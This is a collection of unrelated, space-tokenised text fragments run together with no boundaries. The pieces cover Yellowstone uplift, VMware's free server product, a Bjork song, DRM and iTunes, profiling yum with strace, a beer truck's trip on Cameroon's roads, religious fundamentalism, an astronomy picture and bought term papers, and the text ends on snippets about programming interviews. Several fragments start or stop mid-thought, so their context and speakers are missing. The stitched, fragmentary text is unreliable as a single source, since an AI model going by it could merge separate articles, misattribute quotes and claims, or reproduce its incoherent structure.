Those include the Yellowstone hotspot ’s bulging uplift of the landscape , smaller volcanic ups and downs within the caldera , relaxation of the ground after quakes , and Basin - and - Range stretching of Earth ’s crust that ultimately will generate future quakes .
Smith says the fact non-seismic forces to overwhelm quake energies by 10 - to - 1 " means there is much more energy related to active volcanic processes of uplift and extension of the Earth ’s surface , " he says .
An example :
The southwestern Yellowstone Plateau is moving southwest at one - sixth inch per year , twice as fast as the next block of land to the southwest : the eastern Snake River Plain .
Land from Island Park , Idaho , southwest to Idaho Falls is being squeezed by the collision .
Smith says that represents a lot of energy in a small area because the entire 600 - mile - wide Basin and Range Province between the Sierra and the Rockies is stretching apart only three times faster , or about a half inch per year .

As anticipated , VMware has created a free version of its server partitioning software in the hopes of drawing new customers to its technology .
In addition , the move counters open source rival XenSource , which gives away core server virtualization technology known as a hypervisor .
The free product will be called VMware Server and will join the Workstation , GSX Server and ESX Server products .
VMware Server relates most closely to the midrange GSX Server product often used by VMware customers to test and and develop software packages .
The high - end ESX Server is used for production applications and actually slots in below operating systems such as Windows and Linux , whereas GSX Server and the upcoming VMware Server run on top of the OS .
When plugging VMware Server , which arrives in beta only for the moment , company representatives insisted that we think of the free option as a way to promote virtualization technology .
" There are huge segments of the audience not aware of virtualization , " said Raghu Raghuram , a vice president at VMware .
" Some people have very naive notions about what virtualization is all about .
We are planning to change that . "
VMware first hinted that it may be heading in this direction in our interview with company chief Diane Greene .
When asked about the free product possibility , Greene said , " I do n't know if that 's what we 'll do , but I do n't see anything bad about it .
I do n't know how the software may get packaged .
One thing for sure is that we 'll keep adding a lot of value .
If our software does n't add value , then fine .
We 'll do other software .
I think we are adding unbelievable value right now . "
We like to think she took our advice .
VMware Server should get more people to try out this technology that lets them run multiple operating systems and applications on a single x86 server .
More importantly , however , from a competitive standpoint is its strength against Xen - the free hypervisor for Linux systems .
The VMware Server , for example , has a feature not even present in GSX Server .
It supports Intel 's VT technology for improving virtualization performance .
In addition , it supports 64 - bit guest operating systems - including Solaris x86 - and has support for virtual SMPs .
So , it 's not just some crippled , low - end product .
Raghuram downplayed VMware Server as a response to Xen .
" Xen is only for serious , bleeding - edge Linux enthusiasts , " he said .
" You have to live with a highly unstable open source product that 's of little interest to the average system administrator . "
It should be noted , however , that Xen will ship as a standard package in the upcoming server releases of Red Hat and SuSE , giving XenSource an immediate route to customers wanting to try the technology .
Xen also boasts very high performance .
( Incidentally , VMware gained traction by becoming popular first with Linux enthusiasts , so it might not be such a bad play for XenSource . )
The release of VMware Server might give Microsoft some grief as well .
Redmond has been offering price breaks on its Virtual Server product .
Free beats price breaks every time .
VMware made the move to free more quickly than expected , and it has done so in an interesting way .
It could have issued a free version of ESX Server and turned off some key features .
Instead , it 's simply going after the " try before you buy " crowd that might also be experimenting with Xen .
VMware 's decision buys it some more time to keep selling ESX Server at full price .
It does seem though that it will lose out on those Linux customers who are ready to embrace virtualization and would prefer to use Xen for free instead of paying for ESX Server .
It 's hard to gauge how big of an audience that is .
VMware also has something called the VMware Player , which allows customers to run but not create virtual machines for free .
It has been downloaded more than 1 m times , according to the company .
Next week , a beta version of VMware Server will be available here .
The product is expected to be fully baked in the first half of this year , and VMware expects to sell plenty of support contracts behind it .
Over time , it will effectively replace GSX Server . ®

Considering A Bjork Song In The Context Of The Ancient Greeks
Driving on a not - so - nice Houston freeway , I was listening to Bjork sing a song called “ All Is Full Of Love . ”
She repeats the title of the song over and over .
I was n’t moving so quickly on the highway and I had time to consider what Bjork was asserting .
I ’ve been reading a book called Early Greek Philosophy .
It ’s one of those Penguin Classics books .
The book consists of the remaining fragments of the writings of long - ago Greeks .
The issues the philosphers deal with are elemental .
What do things consist of ?
What is the best life ?
These questions have value when it can be so hard to believe anything anymore .
Maybe it would be best to return to the most basic questions and start all over again .
Bjork ’s lyric that “ All Is Full Of Love ” makes more sense than it may sound .
I often consider the fact that the atoms which comprise inanimate objects arise from the same place as do the atoms of which I am comprised of .
With this in mind , it may not be so far - fetched to grant human or organic qualities to non-living things .
I wish I could fully agree with Bjork .
I do n’t really think that all is full of love .
However , I do believe that a combination of imagination and understanding of the world around us can lead people to a more humane vision of what existence is .
So good for Bjork — She ’s at least on to something .
DRM is dying .
It 's a statement being echoed with increasing frequency around the Web over the last few weeks , and is perhaps best articulated in this Billboard article .
Antony Bruno lays out his case for why 2007 will be the year that the major labels " get it " and stop alienating their customers with restrictive DRM schemes .
But before music lovers start dancing on the ashes of the digital locks they hate so much , let 's all set down the New Year 's champagne and indulge in a spot of pessimism .
DRM is dying ?
Yes , there are plenty of signs that DRM as we know it is changing , perhaps even withering on the warm California grapevine where it 's been growing for so long .
Yahoo has conducted several experiments in the last year , selling MP3 - encoded versions of selected popular songs .
The Sony rootkit debacle showed the general public what a bad idea some of these schemes could be .
Every P2P company still in existence seems to be moving towards some kind of paid - downloads model , and some hope to do this without adding DRM .
And Amazon is rumored to be eyeing the online music store market , but only if it can offer MP3s ( though recall that Amazon 's last attempt at whipping iTunes , its Unbox music service has hardly managed to unseat the leader ) .
Et cetera , ad nauseum , ad infinitum .
And while it 's certainly possible that the music labels will collectively find salvation like a late - 70's Dylan , we 're ( reluctantly ) going on record with the opposite prediction : it ai n't going to happen in 2007 .
Sure , there will be plenty of experimenting .
Labels have certainly realized that DRM is n't the answer to their many woes , and with declining overall album sales , they 'll be more willing to take chances .
Great !
But there 's a powerful force standing in the way of this DRM - free panacea , and it might not be the one you expect : Apple , Inc .
The gatekeeper
As the online music and movie store with the biggest sales numbers and mindshare ( no one else even comes close in the US ) , Apple is a clear trailblazer .
It sets the trends ; it owns the market .
Labels and studios think long and hard before crossing Apple if they want their content to be available on iTunes .
In fact , Apple 's power is so strong that when the iTunes Store gained video , the studios were hesitant to join , and so far only Paramount and Disney have jumped on board .
Why ?
Apple is a stalwart on its pricing scheme , and the video guys are afraid because they saw the public battle between Apple and the music companies .
When labels demanded pricing flexibility , Steve Jobs called them greedy .
And Steve won the argument .
Apple stands to benefit greatly by keeping the FairPlay DRM system up and running .
The lock - in afforded by FairPlay creates an Apple ecosystem that essentially ties the iPod to iTunes and to Apple , at least for commercial transactions .
Someone has even launched an antitrust suit against Apple over this , though the suit 's specific claims are rather broad .
The symbiotic relationship between iTunes and the iPod has been so profitable for Apple that Microsoft has blatantly ripped it off for its new Zune music player .
Apple has managed to create an ecosystem populated with high - margin devices ; the company 's overall gross margins are nearly 30 percent , and so even if iTunes were used solely to drive sales of iPods , it would be worth it for Apple to run the store .
Apple has , in an important sense , become a digital gatekeeper for media companies ; iTunes is the best way to reach consumers with music , movies , podcasts , and television .
Content companies have paid close attention to the success of iTunes ; they 've seen how it saved The Office , pushed billions of dollars in revenue to Disney , and established itself as such a de facto standard on college campuses that students would rather use iTunes than free alternatives .
The content companies now need Jobs & Co. as much as Apple needs them .
Control
Content owners may not like this , but it's the situation that they are faced with in 2007 .
With iPods commanding such a large part of the player market , and iTunes integration so complete that it's the easiest option for new iPod owners in search of more music , Apple can present the best case for DRM to the industry : the success of the iTunes Store .
Given that iTunes is now the # 5 music retailer in the US and rising , the Apple mantra is n't pro-DRM or anti-DRM , but that " the experience is king . "
If Apple opens its DRM , that walled - garden experience could be degraded as customers migrate to other stores with lower prices but more technical problems .
This creates a scenario in which we think Apple can work its influence to keep DRM alive and well in the face of labels showing doubts — and we 're not at all sure that the labels ' doubts are that strong .
Apart from independent labels , no serious , sustained experiment in offering unprotected files has been made by any of the major players in the film , television , or movie businesses .
In fact , Hollywood has spent the last several years drawing up two new draconian forms of DRM ( AACS and BD + ) to protect next - generation video content .
They have also been lobbying like mad for Congressional action on broadcast flags , and they 've gone paranoid about putting CableCARDs in home - built Vista PCs ( it wo n't be possible ) .
The content owners want to be in control .
No , what the content idustry and the consumer electronics industry alike want is not the end of DRM , but a truly interoperable , robust DRM that puts them in control of their content without ceding too much power to one player ( Apple ) .
But now that PlaysForSure has gone bust in all but name and Apple steadfastly refuses to license Fairplay , that 's not going to happen in the music industry .
And Apple 's toehold in the movie and TV business is rapidly becoming a beachhead .
The only way to bypass Apple and still reach the massive iPod demographic is to throw open the digital gates and begin offering content in open MP3 and MPEG - 4 formats that can still be played on Apple 's devices — but losing control this way is just as scary to content owners as losing control to Apple .

–Eric S. Raymond , How To Ask Questions
The Smart Way
Like a lot of what ESR used to write , this is remarkably good advice - clearly written , straightforward , and demonstrating a lot of insight into how functional software communities work .
Thankfully , lots of people still do as ESR says , not as ESR does .
Here is a brief story about one such exchange .
In his recent infamous letter , ESR complained about yum ’s performance .
Not unreasonable ; yum is slow .
But we know that ESR is supposedly an expert hacker , and an expert in asking questions .
So surely if he ’d really meant to get the problem fixed and followed his own advice , his post could have looked something like this :
A bit more on yum performance .
“ yum - C search foo ” makes 1,536,713 system calls .
Even though they ’re almost all under a millisecond , that really adds up .
You could rewrite it in straight assembler , and it would still be slow .
Do n’t blame Python , and do n’t waste your time rewriting it in C until you figure out what the real cause is .
“ apt - cache search foo ” makes 1,254 system calls .
The only one that takes over a millisecond is the call that reads all 7MB of srcpkgcache .bin. 8 ms for that .
yum makes 372,776 reads , 372,115 lseeks , and 474,956 futex calls .
apt - cache makes 912 reads and 23 seeks .
And remember , apt - cache is dealing with 10 x as many packages ! …
All praise strace .
It turns out that when you follow ESR ’s advice write something useful and data - laden like this , instead of a publicity - seeking rant , then you get responses that look something like this :
So , after this dialogue Patrick contacted me offlist with some extremely helpful debug information and some code samples to help optimize a number of things .
Not the least of which is the above search method .
For a search of the word ‘ foo ’ the search went from taking 30s to taking 2s .
It ’s a pretty massive improvement and I appreciate the guidance .
It is obviously sort of sad that it took ESR whining so loudly and publicly to encourage someone to do decent profiling work on a key piece of infrastructure ; but all it took to get it fixed was one person who stopped whining and instead did the nitty - gritty work of profiling with a widely available tool .
The outcome : a faster yum , and a great example of providing useful information and constructive guidance instead of whining .
So here is a great big thanks to all those people who quietly and often without reward do the real work of putting together our software , one email thread at a time .
Those are the people who should be getting publicity and our attention , not the losers .
Thanks ,
Patrick , Seth , and everyone else like you guys .
May you too someday end up on lwn and /. ;)
( mild tangent , from looking at the jargon file for the first time in ages : how did things from little green footballs make their way into the jargon file ?
Stole my cultural heritage indeed . )
WITH 30,000 bottles lashed firmly to the back , the beer truck pulled out of the factory yard .
Or rather , it tried to .
The lunchtime traffic in Douala , Cameroon 's muggy commercial capital , was gridlocked , as usual , and no one wanted to let a 60 - tonne lorry pull out in front of them .
Fortunately the driver , Martin , had been trucking for 19 years , and could manoeuvre the 18 - wheeled beast with skill and calculated aggression .
After several minutes of inching threateningly forward , he managed to barge out into the fast lane , where the truck immediately had to stop .
As far as the eye could see , stationary cars and buses blocked the way .
Considering that Douala is one of Africa 's busiest ports , handling 95 % of Cameroon 's exports and also serving two landlocked neighbours , Chad and the Central African Republic , the poverty of the city 's infrastructure is a bit of a problem .
The roads are resurfaced from time to time , but the soil is soft and the foundations typically too shallow .
Small cracks yawn quickly into wide potholes .
Street boys fill them with sand or rubble , and then beg for tips from motorists .
But their amateur repair work rarely survives the first rainstorm .
Besides the potholes , motorists must dodge the wrecks of cars that have crashed .
Under Cameroonian law , these may not be moved until the police , who are in no hurry , have arrived .
It took our truck half an hour to reach the first petrol station , and another half an hour to fill up , owing to arguments about paperwork .
Another hour and two police road - blocks later , we finally left the city .
That was the end of the easy part of the journey .
Hard trucking
Visitors from rich countries rarely experience the true ghastliness of third - world infrastructure .
They use the relatively smooth roads from airports to hotels , and fly any distance longer than a hike to the curio market .
But the people who actually live and work in countries with rotten infrastructure have to cope with the consequences every day .
These are as profound as they are malign .
So to investigate how bad roads make life harder , this correspondent hitched a ride on a beer truck in Cameroon , a pleasant , peaceful and humid country in the corner of the Gulf of Guinea .
The truck belonged to a haulage firm that makes deliveries for Guinness Cameroon , a local subsidiary of the multinational that makes the eponymous velvety black beer , which is popular in Ireland , Britain — and West Africa .
The plan was to carry 1,600 crates of Guinness and other drinks from the factory in Douala where they were brewed to Bertoua , a small town in Cameroon 's south - eastern rainforest .
As the crow flies , this is less than 500 km ( 313 miles ) — about as far as from New York to Pittsburgh , or London to Edinburgh .
According to a rather optimistic schedule , it should have taken 20 hours , including an overnight rest .
It took four days .
When the truck arrived , it was carrying only two - thirds of its original load .
The scenery was staggering : thickly forested hills , stretching into the distance like an undulating green ocean , with red and yellow blossoms floating on the waves .
Beside the road were piles of cocoa beans , laid out to dry in the sun , and hawkers selling engine oil , tangerines , and succulent four - metre pythons for the pot .
We were able to soak up these sights at our leisure : we were stopped at road - blocks 47 times .
These usually consisted of a pile of tyres or a couple of oil drums in the middle of the road , plus a plank with upturned nails sticking out , which could be pulled aside when the policemen on duty were satisfied that the truck had broken no laws and should be allowed to pass .
Sometimes , they merely gawped into the cab or glanced at the driver 's papers for a few seconds before waving him on .
But the more aggressive ones detained us somewhat longer .
Some asked for beer .
Some complained that they were hungry , often patting their huge stomachs to emphasise the point .
One asked for pills , lamenting that he had indigestion .
But most wanted hard cash , and figured that the best way to get it was to harass motorists until bribed to lay off .
At every other road - block , the policemen checked to see whether the truck was carrying a fire extinguisher .
The driver 's mate , Hippolyte , would have to climb down and show the device to a policeman reclining in the shade of a palm tree , who would inspect it minutely and pore over the instructions on the side .
Similar scrutiny was lavished on tail - lights , axles , wing - mirrors and tyres , all in the name of road safety .
Oddly , no one asked about seat belts , which Cameroonians wear about as often as fur coats .
The gendarme was told that the law he was citing did not , in fact , exist .
He replied : “ Do you have a gun ?
No .
I have a gun , so I know the rules ”
At some road - blocks , the police went through our papers word by word , in the hope of finding an error .
The silliest quibble came from a frowning thug who declared that this correspondent 's visa was on the wrong page of his passport .
The longest delay came in the town of Mbandjok , where the police decided that Martin did not have enough permits , and offered to sell him another for twice the usual price .
When he asked for a receipt , they kept us waiting for three - and - a - half hours .
A gaggle of policemen joined the argument , which grew heated .
The total number of man-hours wasted , ( assuming an average of seven policemen involved , plus three people in the truck ) , was 35 — call it one French working week .
And all for a requested bribe of 8,000 CFA francs ( $ 12 ) .
The pithiest explanation of why Cameroonians have to put up with all this came from the gendarme at road - block number 31 .
He had invented a new law about carrying passengers in trucks , found the driver guilty of breaking it , and confiscated his driving licence .
When it was put to him that the law he was citing did not , in fact , exist , he patted his holster and replied : “ Do you have a gun ?
No .
I have a gun , so I know the rules . ”
Mud , inglorious mud
Even without the unwelcome attentions of the robber - cops , the journey would have been a slog .
Most Cameroonian roads are unpaved : long stretches of rutty red laterite soil with sheer ditches on either side .
Dirt roads are fine so long as it does not rain , but Cameroon is largely rainforest , where it rains often and hard .
Our road was rendered impassable by rain three times , causing delays of up to four hours .
The Cameroonian government has tried to grapple with the problem of rain eroding roads by erecting a series of barriers , with small gaps in the middle , that allow light vehicles to pass but stop heavy trucks from passing while it is pouring .
This is fair .
Big trucks tend to mangle wet roads .
The barriers , which are locked to prevent truckers from lifting them when no one is looking , are supposed to be unlocked when the road has had a chance to dry .
Unfortunately , the officials whose job it is to unlock them are not wholly reliable .
Early on the second evening , not long after our stand - off with the police in Mbandjok , we met a rain barrier in the middle of the forest .
It was dark , and the man with the key was not there .
Asking around nearby villages yielded no clue as to his whereabouts .
We curled up in the hot , mosquito - filled cab and waited for him to return , which he did shortly before midnight .
The hold - up was irritating , but in the end made no difference .
Early the next morning , a driver coming in the opposite direction told us that the bridge ahead had collapsed , so we had to turn back .
Six hours , 11 more road - blocks and three sardine sandwiches later , we arrived in Yaoundé , the capital , where Guinness has a depot .
The alternative route we had to take to get to Bertoua meant passing a weighing station , where vehicles over 50 tonnes face steep tolls .
Since we were 10 tonnes overweight , Martin needed permission to offload 600 crates .
But it was a Saturday , the man in charge was reportedly at lunch , and we did not get permission until the next morning .
It then took all morning to unload the extra crates , despite the fact that the depot was equipped with excellent forklifts .
After 25 hours without moving , we hit the road again , and met no road - blocks for a whole 15 minutes .
For much of the rest of the journey , which took another 17 hours , this correspondent was struck by how terrifying Cameroonian roads are .
Piles of rusting wrecks clogged the grassy verges on the way out of Yaoundé .
We saw several freshly crashed cars and a couple of lorries and buses languishing in ditches .
None of the bridges we crossed seemed well - maintained .
And when we arrived in Bertoua , we heard that two people had been crushed to death on a nearby road the previous day , when a logging truck lost its load on to their heads .
Coping with chaos
Cameroonian roads have wasted away .
In 1980 , there were 7.2 km of roads per 1,000 people ; by 1995 , the figure had shrunk to only 2.6 km per 1,000 .
By one estimate , less than a tenth are paved , and most of these are in a foul condition .
In recent years , however , aided by a splurge of World Bank money , things have improved a bit .
Douala , once considered one of the worst ports on earth , has been substantially rehabilitated since 2000 .
A lot has been done to improve the roads around Douala in the last two years , says Brian Johnson , the managing director of Guinness Cameroon .
The Cameroonian government no longer takes three years to approve plans for roadworks .
But there is much work still to be done , and firms still have to find ways to cope with horrible highways .
Guinness used to buy second - hand army trucks , which was a false economy , because they kept breaking down .
Now , it buys its lorries new from Toyota , with which it has a long - term agreement to ensure that it will always be able to get hold of mechanics and genuine spare parts ( as opposed to fake or stolen ones , which are popular in Cameroon , but of variable quality ) .
The firm is also making more use of owner - drivers , who have a greater incentive to drive carefully .
“ Just - in - time ” delivery is , for obvious reasons , impossible .
Whereas its factories in Europe can turn some raw materials into beer within hours of delivery , Guinness Cameroon has to keep 40 days of inventory in the factory : crates and drums of malt , hops and bottle tops .
Wholesalers out in the bush have to carry as much as five months ' stock at the start of the rainy season , when roads are at their swampiest .
Since they tend to have shallow pockets , Guinness often gives them exceptionally easy credit terms .
Out in the forest , the firm does whatever it takes to get beer into bars and bottle stores .
It is an exercise in creative management .
At the depot in Bertoua , crates are unloaded from big lorries and packed into pick - up trucks , which rush them to wholesalers in small towns .
The wholesalers then sell to retailers and to small distributors , who ferry crates to villages in hand - pushed carts , on heads and even by canoe .
No matter how hard Guinness tries , however , the bars that sell its brew sometimes run dry .
Jean Mière , a young bar - owner in a village called Kuelle , complained that he had nothing to sell to his thirsty customers because the local wholesaler 's driver was in jail .
Yves Ngassa , the local Guinness depot chief , was incensed .
He had arrived in an empty pick - up truck , having been given directions by the wholesaler who normally supplied Mr Mière , but the wholesaler had not mentioned that Mr Mière had no beer , nor asked if he could load some into Mr Ngassa 's empty pick - up .
In all , bad infrastructure adds about 15 % to costs , reckons Mr Johnson .
But labour costs are low , Cameroonians drink a lot of beer , and Guinness 's main competitor , Société Anonyme des Brasseries de Cameroun , faces similar hurdles .
Despite the unusual management challenges , Guinness runs a healthy business in Cameroon , its fifth - biggest market by volume after Britain , Ireland , Nigeria and America .
Its return on capital in Cameroon is around 16 % , and sales of its main brands have grown by 14 % a year over the past five years .
The big losers from lousy infrastructure are ordinary Cameroonians .
How bad roads hurt the poor
Roads in rainforests are a bad thing , argue many environmentalists .
They facilitate illegal logging and destroy indigenous cultures by bringing them into contact with aggressive , disease - carrying , rum - swilling outsiders .
But the absence of roads probably hurts the poor far more .
The simplest way to measure the harm caused by bad infrastructure is to look at how prices change as you move away from big cities .
A bottle of Coca - Cola , for example , costs 300CFA in Yaoundé , where it is bottled .
A mere 125 km down the road , in the small town of Ayos , it is 315CFA , and at a smaller village 100 km further on , it is 350CFA .
Once you leave the main road , prices rise sharply .
A Guinness that costs 350CFA in Douala will set you back 450CFA in an eastern village that can be reached only on foot .
It was worth the wait
What is true of bottled drinks is also true of more or less any other manufactured good .
Soap , axe - heads and kerosene are all much more expensive in remote hamlets than in the big cities .
Even lighter goods , which do not cost so much to transport , such as matches and malaria pills , are significantly dearer .
At the same time , the stuff that the poor have to sell — yams , cassava , mangoes — fetch less in the villages than they do in the towns .
Yet , thanks to poor roads , it is hard and costly to get such perishable , heavy items to market .
So peasant farmers are doubly squeezed by bad roads .
They pay more for what they buy , and receive less for what they sell .
Small wonder that the African Development Bank finds “ a strong link between poverty and remoteness ” .
The UN's International Fund for Agricultural Development estimates that African villages with better physical infrastructure produce one - third more crops per hectare than those with poor infrastructure , enjoy wages 12 % higher , and pay 14 % less for fertiliser .
And no country with good roads has ever suffered famine .
Where roads improve , incomes tend to rise in parallel .
One study estimated that each dollar put into road maintenance in Africa would lower vehicle maintenance costs by $ 2 - 3 a year .
In Cameroon , where the soil is wondrously fertile , farmers start growing cash crops as soon as nearby roads are repaired .
Big commercial farmers benefit too .
Along the highway to Douala lie great plantations of sugar cane , and banana trees whose fruit is wrapped in blue plastic bags , to keep at bay the birds and bugs that might mar the visual perfection demanded by European consumers .
Where roads are left to deteriorate , women bear the heaviest burden .
According to the World Bank , a typical Ugandan woman carries the equivalent of a 10 - litre ( 21 - pint ) jug of water for 10 km every day , while her husband humps only a fifth as much .
With better roads , both men and women can , if nothing else , hitch rides on lorries , thereby sparing their feet and getting their goods more swiftly to market .
The famished road
Sometimes , people find ingenious ways around infrastructure bottlenecks in Africa .
Buses designed for European roads do not last long in Nigeria , so Nigerians import the chassis of heavy European lorries and mount locally manufactured bus bodies on top .
This is much cheaper than importing a whole lorry , and more durable than an imported bus .
Locals also simply adapt .
In parts of Cameroon where there is no electricity to power a refrigerator , people drink their beer — and indeed any other liquid — warm .
But there is no substitute for building and maintaining better infrastructure .
In some areas , such as telecoms , private firms will do the work if allowed to .
Thanks to private investment , mobile telephones have spread throughout Africa with the pace and annoying chirrups of a swarm of locusts .
In Cameroon , Guinness now finds it much easier to contact employees than it did a couple of years ago , although the firm also frets that mobile telephones are gobbling up scarce disposable income that might otherwise be spent on beer .
The private sector does not , however , spontaneously provide roads , because the beneficiaries cannot easily be charged .
Tolls can meet some of the cost of maintaining highways , but it is hard to squeeze money out of peasants on feeder roads .
The World Bank estimates that at least $ 18 billion needs to be pumped each year into African infrastructure if the continent is to attain the sort of growth that might lift large numbers of people out of poverty .
Investment currently runs at less than a third of this .
In the current economic downturn , private companies in the West are in no mood to rush into risky investment , least of all in Africa .
The gap can only be filled , the Bank reckons , by governments and foreign donors .
In short , the governments of poor countries ought to pay more attention to their roads .
A good first step in Cameroon would be to lift those road - blocks and put the police to work repairing potholes .
This type of incident is now common .
Increasingly , people find it difficult to communicate with their co-religionists .
The divide is as great as that between religious and secular people .
Many of the faithful feel threatened by those who interpret their tradition differently ; it seems their sacred values are in jeopardy .
An apparently impassable gulf yawns between liberal and fundamentalist Christians , reform and orthodox Jews , traditional and extremist Muslims .
Because of our preoccupation with the so - called clash of civilisations , this internal tension is often overlooked .
It is a year since the London bombings , an act committed in the name of Islam by a viciously disaffected minority , but which violated the essential principles of any religion .
Doubtless with this anniversary in mind , the prime minister has complained that British Muslims are not doing enough to deal with the extremists .
The " moderate " Muslims , he said testily , must confront the Islamists ; they cannot condemn their methods while tacitly condoning their anger .
The extremists ' anti-western views are wrong , and mainstream Muslims must tell them that violent jihad " is not the religion of Islam " .
This regrettable step will put yet more pressure on a community already under strain .
It ignores the fact that the chief problem for most Muslims is not " the west " per se , but the suffering of Muslims in Guantánamo , Abu Ghraib , Iraq and Palestine .
Many Britons share this dismay , but the strong emphasis placed by Islam upon justice and community solidarity makes this a religious issue for Muslims .
When they see their brothers and sisters systematically oppressed and humiliated , some feel as wounded as a Christian who sees the Bible spat upon or the eucharistic host violated .
It is disingenuous of Tony Blair to separate the rising tide of " Islamism " from his unpopular foreign policy , particularly when Palestinians are being subjected to new dangers in Gaza .
He is also mistaken to imagine that law - abiding Muslims could bring the extremists to heel in the same way that he disciplines recalcitrant members of his cabinet .
This is just not how religious groups operate .
During the 20th century , a militant piety erupted in almost every major world faith : in Buddhism , Sikhism , Hinduism and Confucianism , as well as in Judaism , Christianity and Islam .
It is often called " fundamentalism " .
Its aim is to bring God and / or religion from the sidelines back to centre stage , though very few fundamentalists commit acts of violence .
Coined by American Protestants who wanted a return to Christian " fundamentals " , the term is unsatisfactory , not least because it suggests a conservative and backward - looking religiosity .
In fact , fundamentalists are rebels who have separated themselves irrevocably and on principle from the main body of the faithful .
Fundamentalist movements are nearly always the result of an internal dispute with traditional or liberal co-religionists ; fundamentalists regard them as traitors who have made too many concessions to modernity .
They withdraw from mainstream religious life to create separatist churches , colleges , study groups , madrasas , yeshivas and training camps .
Only later , if at all , do fundamentalists turn their wrath against a foreign foe .
Thus Sayyid Qutb ( 1906 - 66 ) , whose ideology is followed by most Sunni fundamentalists , had no love for the west , but his jihad was primarily directed against such Muslim rulers as Jamal Abdul Nasser .
In order to replace secularist Fatah , Hamas began by attacking the PLO , and was initially funded by Israel in order to undermine Arafat .
Osama bin Laden began by campaigning against the Saudi royal family and secularist rulers such as Saddam Hussein ; later , when he discovered the extent of their support for these regimes , he declared war against the US .
Even when fundamentalists are engaged in a struggle with an external enemy , this internal hostility remains a potent force .
It is unrealistic to hope that radical Islamists will be chastened by a rebuke from " moderate " imams ; they have nothing but contempt for traditional Muslims , who they see as part of the problem .
Nor are extremists likely to be dismayed when told that terrorism violates the religion of Islam .
We often use the word " fundamentalist " wrongly , as a synonym for " orthodox " .
In fact , fundamentalists are unorthodox - even anti-orthodox .
They may invoke the past , but these are innovative movements that promote entirely new doctrines .
Fundamentalist Christians who claim that every word of the Bible is literally true are reading in an essentially modern way ; before the advent of our scientifically oriented culture , Jews , Christians and Muslims all relished highly allegorical interpretations of their holy texts .
Religious Zionists who regard Israel as sacred also fly in the face of tradition .
A hundred years ago , most orthodox rabbis condemned the idea of a Jewish secular state in the Holy Land .
In making the assertion that a cleric should be head of state , Ayatollah Khomeini flouted centuries of Shia orthodoxy , which separated religion and politics as a matter of sacred principle .
The same is true of the new emphasis on violent jihad .
Until recently , no Muslim thinker had ever claimed it was the central tenet of Islam .
The first to make this controversial , even heretical , claim was the Pakistani ideologue Abu Ala Mawdudi in 1939 .
Like Qutb , he was well aware that this innovation could only be justified by the godless cruelty of modernity .
Informed extremists today do not need to be told that their holy war is unorthodox ; they already know .
The extremists believe that mainstream Muslims have failed to respond to the current crisis and are proud of their own deviance .
Attempting to shift the blame to the already beleaguered Muslim community could further alienate the disaffected .
It will certainly not prevent another London bombing .

Astronomy Picture of the Day Discover the cosmos !
Each day a different image or photograph of our fascinating universe is featured , along with a brief explanation written by a professional astronomer .
2006 August 19
Ceci n'est pas un Meteore
Credit & Copyright : Laurent Laveder ( PhotoAstronomique.net )
Explanation :
To paraphrase Magritte , " This is not a meteor " .
It 's not a picture of a meteor either , but it was taken during last weekend 's peak of the Perseid Meteor shower .
Skywatching with friends at a cosy beach campsite bathed in moonlight at Treguennec , France , astronomer and APOD translator Laurent Laveder planned to record bright Perseid meteors with camera and tripod .
While the Perseid meteors he saw were neither numerous nor bright he did capture the brilliant trail of an Iridium communication satellite .
His long exposure began after the satellite glint became visible , so the resulting streak does resemble a meteor trail in the final image .
Also recognizable in the serene view of sandy beach and starry sky is the famous northern asterism , the Big Dipper .
The obvious point of comparison between the two novels is that where Orwell ’s world is an authoritarian , police - state nightmare , Huxley ’s dystopia is ostensibly a paradise , with drugs and sex available on demand .
A clever student might even pick up some extra credit by pointing out that while Orwell meant his book as a kind of predictive warning , it is Huxley ’s world , much more far - fetched at the time of writing , that now more nearly resembles our own .
The essay never exactly makes these points , though it gets close a couple of times , declaring at one point that “ the two works vary greatly . ”
It also manages to remind us that Orwell ’s real name was Eric Blair and that both he and his book “ are misunderstood to this day . ”
The paper does make a number of embarrassing spelling errors ( “ dissention , ” “ anti- semetic ” ) but William H. Pritchard , an English professor at Amherst , who read the paper at The Times ’s request , shrewdly suggested that , in this day of spell check , they may have been included deliberately , to throw suspicious teachers off the track .
If confronted with such a paper from one of his own students , he wrote in an e-mail message , he probably would n’t grade it at all but would instead say “ come see me ” ( shuddering at the prospect ) .
The Hamlet essay was a trick assignment , or perhaps a poorly worded one .
Ophelia ’s genuine madness , as opposed to Hamlet ’s feigned craziness , has become a touchstone in Shakespeare studies , especially among feminist and gender studies scholars who read in Ophelia ’s songs and fragmentary utterances a coded response to the irrationality and sexual repression of the Elizabethan patriarchy .
The author of the four - page paper , supplied by Go-Essays for $ 127.96 , approaches the question more literally and concludes , not incorrectly , that Ophelia is literally driven crazy by her father , brother and lover — or as the essay puts it : “ Thus , in critical review of the play , Ophelia mentally suffers from the scars of unwanted love and exploitation rather than any singular or isolated cause . ”
The paper goes on to repeat this point with so much plot summary and quotation from the text that it soars right to the assigned length .
It ’s also written in language so stilted and often ungrammatical ( “ Hamlet is obviously hurt by Ophelia ’s lack of affection to his vows of love ” ) that it suggests the author may not be a native speaker of English , and even makes you suspect that some of these made - to - order term papers are written by the very same people who pick up the phone when you call to complain about your credit card bill .
Oh , about six years .
Yes , yes , and yes .
Of course , some interviewers are just looking for an excuse to talk about technical issues and will not prejudge you in any way .
Speaking for myself , I would laugh if you wrote something like this out .
But then again , I once worked for someone who had won the second International Obfuscated C Contest .
Do n’t Overthink Fizzbuzz
What I ’m about to say will be blindingly obvious to the Enterprise crowd ( sorry , not you over there with the Greasemonkey script that translates your web email to Klingon ) .
The rules must be considered as carefully as the entities .
Enterprise developers have known this for years : that ’s why you see rules engines , table - driven designs , and visual workflow editors in many Enterprise applications .
My favourite interview question
In case you did n’t know this , about 1/3 of all technical interview questions worldwide are variants of “ How do you fit 10 pounds of crap in a five - pound bag ? ”
Examples : how do you reverse a string in place , how do you sort a billion numbers , how do you write a decent compiler backend for an architecture with only four frigging registers , how do you handle fair scheduling when someone just forked off 1000 copies of some Towers of Hanoi simulation , etc .
Interviewing Ruby programmers
I ’m exaggerating a lot , but the point is , when you select 1 out of 200 applicants , the other 199 do n’t give up and go into plumbing ( although I wish they would … plumbers are impossible to find ) .
They apply again somewhere else , and contribute to some other employer ’s self - delusions about how selective they are .
Joel on Hiring
And then there is the issue of why would someone care if I knew how to write a file copy function , ahead of what the difference between an interface and an abstract class was .
Or when would I use encapsulation ?
Or in my design , how would I choose between polymorphism or inheritance ?
Or what pattern would I recommend for dealing with a general or specific problem ?
What ’s with the programming test !?
